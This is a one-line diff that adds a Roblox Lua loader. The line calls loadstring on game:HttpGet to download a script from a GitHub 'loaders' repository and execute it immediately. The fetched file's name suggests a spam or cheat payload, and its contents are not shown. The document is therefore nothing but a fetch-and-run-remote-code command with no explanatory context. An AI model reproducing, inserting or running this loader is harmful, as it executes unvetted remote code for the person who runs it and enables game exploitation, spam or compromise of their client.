@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/apple-ipad-original-spam6-ga7v6sh4oazquw.lua"))()
